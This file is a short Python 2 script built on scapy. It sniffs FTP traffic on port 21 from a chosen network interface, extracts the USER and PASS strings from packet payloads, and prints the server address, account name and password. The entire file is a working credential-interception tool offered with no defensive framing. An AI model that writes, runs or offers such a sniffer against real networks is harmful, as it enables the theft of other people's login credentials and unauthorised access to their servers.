import socket
from scapy.all import *

def sniffer(pkt):
    try:
        ftpServer=pkt.getlayer(IP).dst
        raw=pkt.sprintf('%Raw.load%')
        account=re.findall('(?i)USER (.*)', raw)
        password=re.findall('(?i)PASS (.*)', raw)
        if account:
            print '[+] FTP Server : '+str(ftpServer)
            print '[+] Account : '+str(account[0])
        elif password:
            print '[+] Password : '+str(password[0])
    except Exception, e:
        pass

def main():
    try:
        interface=raw_input("Input Interface : ")    
        conf.iface=interface
        sniff(filter='tcp port 21', prn=sniffer)
    except Exception, e:
        print "[-] ", e
        exit(0)

if __name__=='__main__':
    main()